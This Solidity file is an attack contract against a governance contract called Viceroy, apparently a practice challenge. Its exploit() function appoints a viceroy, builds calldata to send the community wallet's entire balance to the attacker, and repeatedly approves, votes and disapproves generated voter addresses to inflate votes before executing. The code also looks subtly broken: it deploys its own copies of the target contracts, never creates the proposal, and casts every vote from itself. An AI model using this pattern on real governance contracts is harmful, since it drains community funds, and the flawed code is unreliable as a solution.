// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Viceroy.sol";

contract AttackContract {
    Governance public governance;
    OligarchyNFT public nft;
    address public viceroy;
    
    constructor(address _viceroy) {
        nft = new OligarchyNFT(address(this));
        governance = new Governance(nft);
        viceroy = _viceroy;
    }
    
    function exploit() external {
        // 1. Appoint our viceroy using NFT
        governance.appointViceroy(viceroy, 1);
        
        // 2. Create malicious proposal
        bytes memory drainCalldata = abi.encodeWithSignature(
            "exec(address,bytes,uint256)",
            address(this),
            "",
            address(governance.communityWallet()).balance
        );
        
        uint256 proposalId = uint256(keccak256(drainCalldata));
        
        // 3. Cycle through voter approve/vote/disapprove
        for(uint256 i = 0; i < 10; i++) {
            address voter = address(uint160(uint(keccak256(abi.encodePacked(block.timestamp, i)))));
            
            // Approve voter
            governance.approveVoter(voter);
            
            // Vote
            governance.voteOnProposal(proposalId, true, viceroy);
            
            // Disapprove voter
            governance.disapproveVoter(voter);
        }
        
        // 4. Execute the proposal
        governance.executeProposal(proposalId);
    }
    
    receive() external payable {}
}